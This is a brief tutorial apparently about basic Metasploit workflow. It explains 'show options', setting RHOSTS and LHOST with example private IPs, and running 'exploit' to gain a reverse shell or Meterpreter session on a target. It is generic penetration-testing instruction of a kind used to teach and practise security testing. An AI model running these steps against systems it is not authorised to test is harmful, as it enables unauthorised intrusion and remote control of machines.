Metasploit Workflow

Basic Usage: Set Options and Exploit

Configuring exploit parameters and executing the attack.

`show options`: Displays all configurable parameters for the loaded exploit module, indicating required fields.

`set RHOSTS` & `LHOST`: Configure the target IP address (`RHOSTS`) and your attacking machine's IP (`LHOST`) for the reverse shell.

`exploit`: Executes the configured exploit, aiming to gain a shell or Meterpreter session on the target.

Key Takeaway

Properly setting `RHOSTS` and `LHOST` is critical before executing an exploit to ensure successful initial access.

Command 1: show options - Displays required settings.

Command 2: set RHOSTS 192.168.1.10 - Sets target IP.

Command 3: set LHOST 192.168.1.5 - Sets attacker IP.

Command 4: exploit - Executes the exploit, leading to a shell.
